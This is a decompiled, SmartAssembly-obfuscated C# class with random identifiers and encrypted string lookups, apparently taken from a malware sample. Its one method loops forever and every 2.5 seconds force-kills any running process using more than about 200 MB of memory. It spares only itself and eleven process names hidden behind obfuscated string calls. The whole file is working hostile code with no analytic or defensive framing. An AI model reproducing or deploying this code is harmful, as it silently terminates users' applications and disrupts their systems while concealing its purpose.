using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace maXgRZLUwUwi;

public static class hDcWxlHdMAx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void NOekTfBuhSu()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107404499)) && !process.ProcessName.Contains(getString_0(107404458)) && !process.ProcessName.Contains(getString_0(107404481)) && !process.ProcessName.Contains(getString_0(107404472)) && !process.ProcessName.Contains(getString_0(107404939)) && !process.ProcessName.Contains(getString_0(107404958)) && !process.ProcessName.Contains(getString_0(107404913)) && !process.ProcessName.Contains(getString_0(107404900)) && !process.ProcessName.Contains(getString_0(107404919)) && !process.ProcessName.Contains(getString_0(107404874)) && !process.ProcessName.Contains(getString_0(107404885)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static hDcWxlHdMAx()
	{
		Strings.CreateGetStringDelegate(typeof(hDcWxlHdMAx));
	}
}
